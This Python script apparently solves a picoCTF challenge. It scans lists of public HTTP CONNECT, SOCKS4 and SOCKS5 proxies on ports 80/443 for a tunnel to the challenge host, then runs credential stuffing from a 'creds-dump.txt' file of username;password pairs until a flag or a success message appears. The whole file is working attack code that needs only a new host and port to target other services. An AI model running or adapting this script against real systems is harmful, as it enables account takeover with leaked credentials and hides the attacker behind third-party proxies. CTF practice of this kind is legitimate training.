"""Find a working tunnel (HTTP CONNECT or SOCKS4/5) on allowed egress ports
(80/443) to reach crystal-peak.picoctf.net:58050, then do credential stuffing."""
import socket, struct, time, re, concurrent.futures, sys

HOST = "crystal-peak.picoctf.net"
PORT = 58050
CREDS_FILE = "creds-dump.txt"

def load_lines(path):
    try:
        return [l.strip() for l in open(path, errors="replace") if l.strip()]
    except Exception:
        return []

def sock_connect(host, port, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))
    return s

def try_http_connect(proxy_ip, proxy_port, timeout=6):
    """Try HTTP CONNECT tunnel. Return an open socket to HOST:PORT if success, else None."""
    try:
        s = sock_connect(proxy_ip, proxy_port, timeout)
        req = (f"CONNECT {HOST}:{PORT} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n\r\n").encode()
        s.sendall(req)
        data = b""
        s.settimeout(timeout)
        while b"\r\n\r\n" not in data and len(data) < 4096:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
        first = data.split(b"\r\n", 1)[0].decode(errors="replace")
        # e.g. "HTTP/1.1 200 Connection established"
        if " 200 " in first or first.endswith(" 200"):
            # tunnel established; now try to read the challenge banner to confirm
            s.settimeout(6)
            try:
                banner = s.recv(4096)
            except socket.timeout:
                banner = b""
            return s, banner
        return None, None
    except Exception:
        return None, None

def try_socks4(proxy_ip, proxy_port, timeout=6):
    try:
        s = sock_connect(proxy_ip, proxy_port, timeout)
        # SOCKS4 CONNECT: VN=0x04, CD=0x01, DSTPORT(2), DSTIP(4), USERID\0
        # Use IP form
        ipbytes = socket.inet_aton(socket.gethostbyname(HOST))
        pkt = b"\x04\x01" + struct.pack(">H", PORT) + ipbytes + b"\x00"
        s.sendall(pkt)
        s.settimeout(timeout)
        resp = s.recv(8)
        if len(resp) >= 8 and resp[0] == 0x00 and resp[1] == 0x5A:
            s.settimeout(6)
            try:
                banner = s.recv(4096)
            except socket.timeout:
                banner = b""
            return s, banner
        return None, None
    except Exception:
        return None, None

def try_socks5(proxy_ip, proxy_port, timeout=6):
    try:
        s = sock_connect(proxy_ip, proxy_port, timeout)
        # greeting: no auth
        s.sendall(b"\x05\x01\x00")
        s.settimeout(timeout)
        resp = s.recv(2)
        if len(resp) < 2 or resp[0] != 0x05 or resp[1] not in (0x00, 0x02):
            return None, None
        if resp[1] == 0x02:
            # needs auth - skip
            return None, None
        # connect request: DOMAINNAME
        host_b = HOST.encode()
        pkt = b"\x05\x01\x00\x03" + bytes([len(host_b)]) + host_b + struct.pack(">H", PORT)
        s.sendall(pkt)
        resp = s.recv(10)
        if len(resp) >= 2 and resp[1] == 0x00:
            s.settimeout(6)
            try:
                banner = s.recv(4096)
            except socket.timeout:
                banner = b""
            return s, banner
        return None, None
    except Exception:
        return None, None

# Gather candidate proxies on ports 80/443
candidates = []
for f in ("list_http.txt", "list_socks4.txt", "list_socks5.txt"):
    for line in load_lines(f):
        if ":" in line:
            ip, p = line.rsplit(":", 1)
            try:
                p = int(p)
            except ValueError:
                continue
            if p in (80, 443):
                kind = "http" if f == "list_http.txt" else ("socks4" if "socks4" in f else "socks5")
                candidates.append((kind, ip, p))

# dedupe
seen = set()
cands = []
for c in candidates:
    if c in seen:
        continue
    seen.add(c)
    cands.append(c)
print(f"[*] {len(cands)} unique candidate proxies on ports 80/443")

def test_one(c):
    kind, ip, p = c
    if kind == "http":
        s, banner = try_http_connect(ip, p)
    elif kind == "socks4":
        s, banner = try_socks4(ip, p)
    else:
        s, banner = try_socks5(ip, p)
    if s is not None:
        return (kind, ip, p, banner, s)
    return None

found = None
print("[*] Testing tunnels (concurrency 64)...")
start = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
    futs = {ex.submit(test_one, c): c for c in cands}
    done = 0
    for fut in concurrent.futures.as_completed(futs):
        done += 1
        if done % 30 == 0:
            print(f"  ...{done}/{len(cands)} tested, {time.time()-start:.0f}s")
        r = fut.result()
        if r:
            kind, ip, p, banner, s = r
            print(f"\n[+] TUNNEL WORKS: {kind}://{ip}:{p}")
            print(f"    banner bytes ({len(banner)}): {banner[:200]!r}")
            found = (kind, ip, p, s, banner)
            # cancel remaining
            for f in futs:
                f.cancel()
            break

if not found:
    print("[-] No working tunnel found.")
    sys.exit(2)

kind, ip, p, tun_sock, banner = found
print(f"[*] Using tunnel {kind}://{ip}:{p}")

# Now do credential stuffing through a fresh tunnel per attempt (tunnels may be flaky)
def open_tunnel(timeout=10):
    if kind == "http":
        s, b = try_http_connect(ip, p, timeout=timeout)
    elif kind == "socks4":
        s, b = try_socks4(ip, p, timeout=timeout)
    else:
        s, b = try_socks5(ip, p, timeout=timeout)
    return s, b

def recv_until(s, marker, timeout=6):
    s.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def try_login(user, pwd, timeout=8):
    s, banner = open_tunnel(timeout=timeout)
    if s is None:
        return "TUNNEL_FAIL"
    try:
        data = banner
        if b"Username: " not in data:
            data += recv_until(s, b"Username: ", timeout)
        if b"Username: " not in data:
            return "NO_PROMPT:" + data.decode(errors="replace")[:100]
        s.sendall((user + "\n").encode())
        data2 = recv_until(s, b"Password: ", timeout)
        if b"Password: " not in data2:
            return "NO_PASS_PROMPT:" + data2.decode(errors="replace")[:100]
        s.sendall((pwd + "\n").encode())
        resp = b""
        try:
            s.settimeout(4)
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        return (data + data2 + resp).decode("utf-8", errors="replace")
    finally:
        try:
            s.close()
        except Exception:
            pass

# Load creds
creds = []
for line in load_lines(CREDS_FILE):
    if ";" in line:
        u, pw = line.split(";", 1)
        creds.append((u.strip(), pw.strip()))
print(f"[*] Loaded {len(creds)} credential pairs")

flag = None
hits = []
for i, (u, pw) in enumerate(creds):
    if i % 25 == 0:
        print(f"  [{i}/{len(creds)}] last-tunnel ok, trying {u}:{pw} ...")
    resp = try_login(u, pw)
    if resp == "TUNNEL_FAIL":
        # retry a few times with fresh tunnel
        for _ in range(3):
            resp = try_login(u, pw)
            if resp != "TUNNEL_FAIL":
                break
    if resp and "picoCTF{" in resp:
        m = re.search(r"picoCTF\{[^}]+\}", resp)
        print(f"\n[+] FLAG at #{i} {u}:{pw}")
        print(resp[:600])
        if m:
            flag = m.group()
        break
    if resp and ("TUNNEL" not in resp and "NO_" not in resp):
        low = resp.lower()
        if any(k in low for k in ["welcome","success","granted","authenticated","logged in","flag","balance","account"]):
            if "invalid" not in low and "incorrect" not in low and "failed" not in low:
                print(f"  [?] hit #{i} {u}:{pw}: {resp[:200]}")
                hits.append((i,u,pw,resp))

print("\n=== DONE ===")
if flag:
    print("FLAG:", flag)
else:
    print("No flag found. hits:", len(hits))
    for h in hits[:10]:
        print(h)